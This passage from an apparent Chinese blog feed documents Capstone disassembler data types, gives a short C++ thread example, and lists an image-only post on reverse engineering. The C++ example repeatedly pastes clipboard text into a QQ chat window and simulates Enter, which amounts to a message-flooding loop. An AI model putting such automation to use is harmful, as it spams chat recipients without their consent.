class="number">1</span> &lt;&lt; <span class="number">6</span>,<span class="comment">///&lt; ARM解码方式ARMv8 A32 </span></span><br><span class="line">CS_MODE_MICRO = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; MicroMips 模式 (MIPS)</span></span><br><span class="line">CS_MODE_MIPS3 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; Mips III ISA</span></span><br><span class="line">CS_MODE_MIPS32R6 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; Mips32r6 ISA</span></span><br><span class="line">CS_MODE_MIPS2 = <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="comment">///&lt; Mips II ISA</span></span><br><span class="line">CS_MODE_V9 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; SparcV9 模式 (Sparc)</span></span><br><span class="line">CS_MODE_QPX = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; Quad Processing eXtensions 模式 (PPC)</span></span><br><span class="line">CS_MODE_M68K_000 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">///&lt; M68K 68000 模式</span></span><br><span class="line">CS_MODE_M68K_010 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">///&lt; M68K 68010 模式</span></span><br><span class="line">CS_MODE_M68K_020 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>, <span class="comment">///&lt; M68K 68020 模式</span></span><br><span class="line">CS_MODE_M68K_030 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; M68K 68030 模式</span></span><br><span class="line">CS_MODE_M68K_040 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; M68K 68040 模式</span></span><br><span class="line">CS_MODE_M68K_060 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; M68K 68060 模式</span></span><br><span class="line">CS_MODE_BIG_ENDIAN = <span class="number">1</span> &lt;&lt; <span class="number">31</span>,<span class="comment">///&lt; big-endian 模式</span></span><br><span class="line">CS_MODE_MIPS32 = CS_MODE_32,<span class="comment">///&lt; Mips32 ISA (Mips)</span></span><br><span class="line">CS_MODE_MIPS64 = CS_MODE_64,<span class="comment">///&lt; Mips64 ISA (Mips)</span></span><br><span class="line">CS_MODE_M680X_6301 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">///&lt; M680X Hitachi 6301,6303 模式</span></span><br><span class="line">CS_MODE_M680X_6309 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">///&lt; M680X Hitachi 6309 模式</span></span><br><span class="line">CS_MODE_M680X_6800 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>, <span class="comment">///&lt; M680X Motorola 6800,6802 模式</span></span><br><span class="line">CS_MODE_M680X_6801 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; M680X Motorola 6801,6803 模式</span></span><br><span class="line">CS_MODE_M680X_6805 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; M680X Motorola/Freescale 6805 模式</span></span><br><span class="line">CS_MODE_M680X_6808 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP 68HC08 模式</span></span><br><span class="line">CS_MODE_M680X_6809 = <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="comment">///&lt; M680X Motorola 6809 模式</span></span><br><span class="line">CS_MODE_M680X_6811 = <span class="number">1</span> &lt;&lt; <span class="number">8</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP 68HC11 模式</span></span><br><span class="line">CS_MODE_M680X_CPU12 = <span class="number">1</span> &lt;&lt; <span class="number">9</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP CPU12</span></span><br><span class="line"><span class="comment">///&lt; 用于 M68HC12/HCS12</span></span><br><span class="line">CS_MODE_M680X_HCS08 = <span class="number">1</span> &lt;&lt; <span class="number">10</span>, <span class="comment">///&lt; M680X Freescale/NXP HCS08 模式</span></span><br><span class="line">&#125; cs_mode;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API中cs_mode参数填入枚举内容，如API中cs_open(cs_arch arch, cs_mode mode, csh *handle);第二个参数填CS_MODE_64则支持X64模式</p></blockquote><h4 id="cs-opt-mem"><a href="#cs-opt-mem" class="headerlink" title="cs_opt_mem"></a>cs_opt_mem</h4><p>内存操作</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mem</span> &#123;</span></span><br><span class="line"><span class="keyword">cs_malloc_t</span> <span class="built_in">malloc</span>;</span><br><span class="line"><span class="keyword">cs_calloc_t</span> <span class="built_in">calloc</span>;</span><br><span class="line"><span class="keyword">cs_realloc_t</span> <span class="built_in">realloc</span>;</span><br><span class="line"><span class="keyword">cs_free_t</span> <span class="built_in">free</span>;</span><br><span class="line"><span class="keyword">cs_vsnprintf_t</span> vsnprintf;</span><br><span class="line">&#125; cs_opt_mem;</span><br></pre></td></tr></table></figure><blockquote><p>用法：可使用用户自定义的malloc/calloc/realloc/free/vsnprintf()函数，默认使用系统自带malloc(), calloc(), realloc(), free() &amp; vsnprintf()</p></blockquote><h4 id="cs-opt-mnem"><a href="#cs-opt-mnem" class="headerlink" title="cs_opt_mnem"></a>cs_opt_mnem</h4><p>自定义助记符</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mnem</span> &#123;</span></span><br><span class="line"><span class="comment">/// 需要自定义的指令ID</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> id;</span><br><span class="line"><span class="comment">/// 自定义的助记符</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *mnemonic;</span><br><span class="line">&#125; cs_opt_mnem;</span><br></pre></td></tr></table></figure><h4 id="cs-opt-type"><a href="#cs-opt-type" class="headerlink" title="cs_opt_type"></a>cs_opt_type</h4><p>反编译的运行时选项</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_opt_type &#123;</span><br><span class="line">CS_OPT_INVALID = <span class="number">0</span>,<span class="comment">///&lt; 无特殊要求</span></span><br><span class="line">CS_OPT_SYNTAX,<span class="comment">///&lt; 汇编输出语法</span></span><br><span class="line">CS_OPT_DETAIL,<span class="comment">///&lt; 将指令结构分解为多个细节</span></span><br><span class="line">CS_OPT_MODE,<span class="comment">///&lt; 运行时改变引擎模式</span></span><br><span class="line">CS_OPT_MEM,<span class="comment">///&lt; 用户定义的动态内存相关函数</span></span><br><span class="line">CS_OPT_SKIPDATA, <span class="comment">///&lt; 在反汇编时跳过数据。然后引擎将处于SKIPDATA模式</span></span><br><span class="line">CS_OPT_SKIPDATA_SETUP, <span class="comment">///&lt; 为SKIPDATA选项设置用户定义函数</span></span><br><span class="line">CS_OPT_MNEMONIC, <span class="comment">///&lt;自定义指令助记符</span></span><br><span class="line">CS_OPT_UNSIGNED, <span class="comment">///&lt; 以无符号形式打印立即操作数</span></span><br><span class="line">&#125; cs_opt_type;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API cs_option(csh handle, cs_opt_type type, size_t value);中第二个参数</p></blockquote><h4 id="cs-opt-value"><a href="#cs-opt-value" class="headerlink" title="cs_opt_value"></a>cs_opt_value</h4><p>运行时选项值(与cs_opt_type关联)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_opt_value &#123;</span><br><span class="line">CS_OPT_OFF = <span class="number">0</span>,  <span class="comment">///&lt; 关闭一个选项 - 默认为CS_OPT_DETAIL, CS_OPT_SKIPDATA, CS_OPT_UNSIGNED.</span></span><br><span class="line">CS_OPT_ON = <span class="number">3</span>, <span class="comment">///&lt; 打开一个选项 (CS_OPT_DETAIL, CS_OPT_SKIPDATA).</span></span><br><span class="line">CS_OPT_SYNTAX_DEFAULT = <span class="number">0</span>, <span class="comment">///&lt; 默认asm语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_INTEL, <span class="comment">///&lt; X86 Intel asm语法 - 默认开启 X86 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_ATT,   <span class="comment">///&lt; X86 ATT 汇编语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_NOREGNAME, <span class="comment">///&lt; 只打印寄存器名和编号 (CS_OPT_SYNTAX)</span></span><br><span class="line">CS_OPT_SYNTAX_MASM, <span class="comment">///&lt; X86 Intel Masm 语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">&#125; cs_opt_value;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API cs_option(csh handle, cs_opt_type type, size_t value);中第三个参数</p></blockquote><h4 id="cs-op-type"><a href="#cs-op-type" class="headerlink" title="cs_op_type"></a>cs_op_type</h4><p>通用指令操作数类型，在所有架构中保持一致</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_op_type &#123;</span><br><span class="line">CS_OP_INVALID = <span class="number">0</span>,  <span class="comment">///&lt; 未初始化/无效的操作数</span></span><br><span class="line">CS_OP_REG,          <span class="comment">///&lt; 寄存器操作数</span></span><br><span class="line">CS_OP_IMM,          <span class="comment">///&lt; 立即操作数</span></span><br><span class="line">CS_OP_MEM,          <span class="comment">///&lt; 内存操作数</span></span><br><span class="line">CS_OP_FP,           <span class="comment">///&lt; 浮点数</span></span><br><span class="line">&#125; cs_op_type;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-ac-type"><a href="#cs-ac-type" class="headerlink" title="cs_ac_type"></a>cs_ac_type</h4><p>通用指令操作数访问类型，在所有架构中保持一致<br>可以组合访问类型，例如:CS_AC_READ | CS_AC_WRITE</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_ac_type &#123;</span><br><span class="line">CS_AC_INVALID = <span class="number">0</span>,        <span class="comment">///&lt; 未初始化/无效的访问类型</span></span><br><span class="line">CS_AC_READ    = <span class="number">1</span> &lt;&lt; <span class="number">0</span>,   <span class="comment">///&lt; 操作数从内存或寄存器中读取</span></span><br><span class="line">CS_AC_WRITE   = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,   <span class="comment">///&lt; 操作数从内存或寄存器中写入</span></span><br><span class="line">&#125; cs_ac_type;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-group-type"><a href="#cs-group-type" class="headerlink" title="cs_group_type"></a>cs_group_type</h4><p>公共指令组，在所有架构中保持一致</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cs_group_type &#123;</span><br><span class="line">CS_GRP_INVALID = <span class="number">0</span>,  <span class="comment">///&lt; 未初始化/无效指令组</span></span><br><span class="line">CS_GRP_JUMP,    <span class="comment">///&lt; 所有跳转指令(条件跳转+直接跳转+间接跳转)</span></span><br><span class="line">CS_GRP_CALL,    <span class="comment">///&lt; 所有调用指令</span></span><br><span class="line">CS_GRP_RET,     <span class="comment">///&lt; 所有返回指令</span></span><br><span class="line">CS_GRP_INT,     <span class="comment">///&lt; 所有中断指令(int+syscall)</span></span><br><span class="line">CS_GRP_IRET,    <span class="comment">///&lt; 所有中断返回指令</span></span><br><span class="line">CS_GRP_PRIVILEGE,    <span class="comment">///&lt; 所有特权指令</span></span><br><span class="line">CS_GRP_BRANCH_RELATIVE, <span class="comment">///&lt; 所有相关分支指令</span></span><br><span class="line">&#125; cs_group_type;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-opt-skipdata"><a href="#cs-opt-skipdata" class="headerlink" title="cs_opt_skipdata"></a>cs_opt_skipdata</h4><p>用户自定义设置SKIPDATA选项</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_skipdata</span> &#123;</span></span><br><span class="line"><span class="comment">/// Capstone认为要跳过的数据是特殊的“指令”</span></span><br><span class="line"><span class="comment">/// 用户可以在这里指定该指令的“助记符”字符串</span></span><br><span class="line"><span class="comment">/// 默认情况下(@mnemonic为NULL)， Capstone使用“.byte”</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *mnemonic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 用户定义的回调函数，当Capstone命中数据时调用</span></span><br><span class="line"><span class="comment">/// 如果这个回调返回的值是正数(&gt;0)，Capstone将跳过这个字节数并继续。如果回调返回0,Capstone将停止反汇编并立即从cs_disasm()返回</span></span><br><span class="line"><span class="comment">/// 注意:如果这个回调指针为空，Capstone会根据架构跳过一些字节，如下所示:</span></span><br><span class="line"><span class="comment">/// Arm:     2 bytes (Thumb mode) or 4 bytes.</span></span><br><span class="line"><span class="comment">/// Arm64:   4 bytes.</span></span><br><span class="line"><span class="comment">/// Mips:    4 bytes.</span></span><br><span class="line"><span class="comment">/// M680x:   1 byte.</span></span><br><span class="line"><span class="comment">/// PowerPC: 4 bytes.</span></span><br><span class="line"><span class="comment">/// Sparc:   4 bytes.</span></span><br><span class="line"><span class="comment">/// SystemZ: 2 bytes.</span></span><br><span class="line"><span class="comment">/// X86:     1 bytes.</span></span><br><span class="line"><span class="comment">/// XCore:   2 bytes.</span></span><br><span class="line"><span class="comment">/// EVM:     1 bytes.</span></span><br><span class="line"><span class="keyword">cs_skipdata_cb_t</span> callback; <span class="comment">// 默认值为 NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 用户自定义数据将被传递给@callback函数指针</span></span><br><span class="line"><span class="keyword">void</span> *user_data;</span><br><span class="line">&#125; cs_opt_skipdata;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p><h4 id="cs-detail"><a href="#cs-detail" class="headerlink" title="cs_detail"></a>cs_detail</h4><p>注意:只有当CS_OPT_DETAIL = CS_OPT_ON时，cs_detail中的所有信息才可用</p></blockquote><p>在arch/ARCH/ARCHDisassembler.c的ARCH_getInstruction中初始化为memset(., 0, offsetof(cs_detail, ARCH)+sizeof(cs_ARCH))</p><p>如果cs_detail发生了变化，特别是在union之后添加了字段，那么相应地更新arch/ arch/ archdisassembly .c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_detail</span> &#123;</span></span><br><span class="line"><span class="keyword">uint16_t</span> regs_read[<span class="number">12</span>]; <span class="comment">///&lt; 这个参数读取隐式寄存器列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> regs_read_count; <span class="comment">///&lt; 这个参数读取隐式寄存器计数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint16_t</span> regs_write[<span class="number">20</span>]; <span class="comment">///&lt; 这个参数修改隐式寄存器列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> regs_write_count; <span class="comment">///&lt; 这个参数修改隐式寄存器计数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> groups[<span class="number">8</span>]; <span class="comment">///&lt; 此指令所属的指令组的列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> groups_count; <span class="comment">///&lt; 此指令所属的组的数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 特定于体系结构的信息</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">cs_x86 x86;     <span class="comment">///&lt; X86 架构, 包括 16-bit, 32-bit &amp; 64-bit 模式</span></span><br><span class="line">cs_arm64 arm64; <span class="comment">///&lt; ARM64 架构 (aka AArch64)</span></span><br><span class="line">cs_arm arm;     <span class="comment">///&lt; ARM 架构 (包括 Thumb/Thumb2)</span></span><br><span class="line">cs_m68k m68k;   <span class="comment">///&lt; M68K 架构</span></span><br><span class="line">cs_mips mips;   <span class="comment">///&lt; MIPS 架构</span></span><br><span class="line">cs_ppc ppc;    <span class="comment">///&lt; PowerPC 架构</span></span><br><span class="line">cs_sparc sparc; <span class="comment">///&lt; Sparc 架构</span></span><br><span class="line">cs_sysz sysz;   <span class="comment">///&lt; SystemZ 架构</span></span><br><span class="line">cs_xcore xcore; <span class="comment">///&lt; XCore 架构</span></span><br><span class="line">cs_tms320c64x tms320c64x;  <span class="comment">///&lt; TMS320C64x 架构</span></span><br><span class="line">cs_m680x m680x; <span class="comment">///&lt; M680X 架构</span></span><br><span class="line">cs_evm evm;    <span class="comment">///&lt; Ethereum 架构</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; cs_detail;</span><br></pre></td></tr></table></figure><h4 id="cs-insn"><a href="#cs-insn" class="headerlink" title="cs_insn"></a>cs_insn</h4><p>指令的详细信息</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_insn</span> &#123;</span></span><br><span class="line"><span class="comment">/// 指令ID(基本上是一个用于指令助记符的数字ID)</span></span><br><span class="line"><span class="comment">/// 应在相应架构的头文件中查找'[ARCH]_insn' enum中的指令id，如ARM.h中的'arm_insn'代表ARM, X86.h中的'x86_insn'代表X86等…</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="comment">/// 注意:在Skipdata模式下，这个id字段的“data”指令为0</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令地址 (EIP)</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令长度</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint16_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 此指令的机器码，其字节数由上面的@size表示</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint8_t</span> bytes[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令的Ascii文本助记符</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">char</span> mnemonic[CS_MNEMONIC_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令操作数的Ascii文本</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">char</span> op_str[<span class="number">160</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// cs_detail指针</span></span><br><span class="line"><span class="comment">/// 注意:只有同时满足以下两个要求时，detail指针才有效:</span></span><br><span class="line"><span class="comment">/// (1) CS_OP_DETAIL = CS_OPT_ON</span></span><br><span class="line"><span class="comment">/// (2) 引擎未处于Skipdata模式(CS_OP_SKIPDATA选项设置为CS_OPT_ON)</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// 注意2:当处于Skipdata模式或detail模式关闭时，即使这个指针不是NULL，它的内容仍然是不相关的。</span></span><br><span class="line">cs_detail *detail;</span><br><span class="line">&#125; cs_insn;</span><br></pre></td></tr></table></figure><h4 id="cs-err"><a href="#cs-err" class="headerlink" title="cs_err"></a>cs_err</h4><p>Capstone API遇到的各类型的错误时cs_errno()的返回值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> cs_err &#123;</span><br><span class="line">CS_ERR_OK = <span class="number">0</span>,   <span class="comment">///&lt; 无错误</span></span><br><span class="line">CS_ERR_MEM,      <span class="comment">///&lt; 内存不足: cs_open(), cs_disasm(), cs_disasm_iter()</span></span><br><span class="line">CS_ERR_ARCH,     <span class="comment">///&lt; 不支持的架构: cs_open()</span></span><br><span class="line">CS_ERR_HANDLE,   <span class="comment">///&lt;句柄不可用: cs_op_count(), cs_op_index()</span></span><br><span class="line">CS_ERR_CSH,      <span class="comment">///&lt; csh参数不可用: cs_close(), cs_errno(), cs_option()</span></span><br><span class="line">CS_ERR_MODE,     <span class="comment">///&lt; 无效的或不支持的模式: cs_open()</span></span><br><span class="line">CS_ERR_OPTION,   <span class="comment">///&lt; 无效的或不支持的选项: cs_option()</span></span><br><span class="line">CS_ERR_DETAIL,   <span class="comment">///&lt; 信息不可用，因为detail选项是关闭的</span></span><br><span class="line">CS_ERR_MEMSETUP, <span class="comment">///&lt; 动态内存管理未初始化(见 CS_OPT_MEM)</span></span><br><span class="line">CS_ERR_VERSION,  <span class="comment">///&lt; 不支持版本 (bindings)</span></span><br><span class="line">CS_ERR_DIET,     <span class="comment">///&lt; 在“diet”引擎中访问不相关的数据</span></span><br><span class="line">CS_ERR_SKIPDATA, <span class="comment">///&lt; 在SKIPDATA模式下访问与“数据”指令无关的数据</span></span><br><span class="line">CS_ERR_X86_ATT,  <span class="comment">///&lt; X86 AT&amp;T 语法不支持(在编译时退出)</span></span><br><span class="line">CS_ERR_X86_INTEL, <span class="comment">///&lt; X86 Intel 语法不支持(在编译时退出)</span></span><br><span class="line">CS_ERR_X86_MASM, <span class="comment">///&lt; X86 Intel 语法不支持(在编译时退出)</span></span><br><span class="line">&#125; cs_err;</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(一">https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(一)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-一&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-一&quot; class=&quot;headerlink&quot; title=&quot;Capstone反汇编引擎数据类型及API分析及示例(一)&quot;&gt;&lt;/a&gt;C
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>C++调用线程实现QQ消息循环发送</title>
    <link href="https://kabeor.github.io/C++%E8%B0%83%E7%94%A8%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0QQ%E6%B6%88%E6%81%AF%E5%BE%AA%E7%8E%AF%E5%8F%91%E9%80%81/"/>
    <id>https://kabeor.github.io/C++调用线程实现QQ消息循环发送/</id>
    <published>2019-04-24T11:35:50.051Z</published>
    <updated>2019-04-24T11:44:48.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-调用线程实现QQ消息循环发送"><a href="#C-调用线程实现QQ消息循环发送" class="headerlink" title="C++调用线程实现QQ消息循环发送"></a>C++调用线程实现QQ消息循环发送</h1><p>##函数原型<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned long _beginthread(  </span><br><span class="line">             void(_cdecl *start_address)(void *), //声明为void (*start_address)(void *)形式  </span><br><span class="line">             unsigned stack_size, //是线程堆栈大小，一般默认为0  </span><br><span class="line">             void *arglist //向线程传递的参数，一般为结构体</span><br><span class="line">           ); </span><br><span class="line"></span><br><span class="line">unsigned long _beginthreadex( //推荐使用   </span><br><span class="line">             void *security,//安全属性，NULL表示默认安全性  </span><br><span class="line">             unsigned stack_size, //是线程堆栈大小，一般默认为0  </span><br><span class="line">             unsigned(_stdcall  *start_address)(void *),//声明为unsigned(*start_address)(void *)形式  </span><br><span class="line">             void *argilist,//向线程传递的参数，一般为结构体  </span><br><span class="line">             unsigned initflag, //新线程的初始状态，0表示立即执行，CREATE_SUSPEND表示创建后挂起。  </span><br><span class="line">             unsigned *thrdaddr //该变量存放线程标识符，它是CreateThread函数中的线程ID。); //创建成功条件下的将线程句柄转化为unsigned long型返回，创建失败条件下返回0</span><br></pre></td></tr></table></figure></p><blockquote><p>使用_beginthreadex而不是CreateThread的原因</p></blockquote><p> _beginthreadex在内部调用了CreateThread，在调用之前_beginthreadex做了很多的工作，从而使得它比CreateThread更安全。</p><p>通常建议使用_beginthreadex函数，而不是CreateThread函数，这使得线程中的代码不需要考虑C/C++代码的线程安全性，除非你清楚地知道在新的线程中不会调用到线程不安全的C/C++代码，这时候放心地使用CreateThread也无可厚非(实际上这种情况很难判定)。_beginthreadex保证了某些C/C++运行库代码的线程安全性，而CreateThread没有对这些特殊的C/C++代码做出保证，这里再次强调这两个函数的区别。不要含糊地认为CreateThread的设计存在缺陷，CreateThread的功能并不专门针对于C/C++运行库，理所当然不必为其多线程安全性而负责。</p><p>##实现<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> _<span class="function">stdcall <span class="title">ThreadOne</span><span class="params">(<span class="keyword">void</span>* Parg)</span>                   <span class="comment">//stdcall自动平衡堆栈</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"输入发送次数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; j;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span> ; i &lt; j; i++)</span><br><span class="line">&#123;</span><br><span class="line">SendMessage((HWND)<span class="number">0x002401E8</span>, WM_PASTE, <span class="number">0</span>, <span class="number">0</span>);    <span class="comment">//获取窗口线程   获取剪切板内容</span></span><br><span class="line">        Sleep(<span class="number">300</span>);</span><br><span class="line">keybd_event(VK_RETURN, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);                  <span class="comment">//模拟按下回车</span></span><br><span class="line">keybd_event(VK_RETURN, <span class="number">0</span>, KEYEVENTF_KEYUP, <span class="number">0</span>);    <span class="comment">//模拟弹起回车</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_beginthreadex(<span class="literal">NULL</span>,<span class="literal">NULL</span>,ThreadOne,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>);        <span class="comment">//线程调用</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"输入发送次数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>From <a href="https://kabeor.github.io/C++调用线程实现QQ消息循环发送/">https://kabeor.github.io/C++调用线程实现QQ消息循环发送/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C-调用线程实现QQ消息循环发送&quot;&gt;&lt;a href=&quot;#C-调用线程实现QQ消息循环发送&quot; class=&quot;headerlink&quot; title=&quot;C++调用线程实现QQ消息循环发送&quot;&gt;&lt;/a&gt;C++调用线程实现QQ消息循环发送&lt;/h1&gt;&lt;p&gt;##函数原型&lt;br&gt;&lt;f
      
    
    </summary>
    
      <category term="Code" scheme="https://kabeor.github.io/categories/Code/"/>
    
    
      <category term="C++多线程" scheme="https://kabeor.github.io/tags/C-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>逆向的难点、如何进阶和逆向其他题型</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E9%9A%BE%E7%82%B9%E3%80%81%E5%A6%82%E4%BD%95%E8%BF%9B%E9%98%B6%E5%92%8C%E9%80%86%E5%90%91%E5%85%B6%E4%BB%96%E9%A2%98%E5%9E%8B/"/>
    <id>https://kabeor.github.io/逆向的难点、如何进阶和逆向其他题型/</id>
    <published>2019-03-31T05:59:01.761Z</published>
    <updated>2018-07-14T10:50:37.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向的难点、如何进阶和逆向其他题型"><a href="#逆向的难点、如何进阶和逆向其他题型" class="headerlink" title="逆向的难点、如何进阶和逆向其他题型"></a>逆向的难点、如何进阶和逆向其他题型</h1><p><img src="https://i.loli.net/2018/07/14/5b49d5799e7f8.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d579c3cb7.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d579ea235.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d57a18654.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d57a2dff1.jpg" alt="mark"></p><p>From <a href="https://kabeor.github.io/逆向的难点、如何进阶和逆向其他题型/">https://kabeor.github.io/逆向的难点、如何进阶和逆向其他题型/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
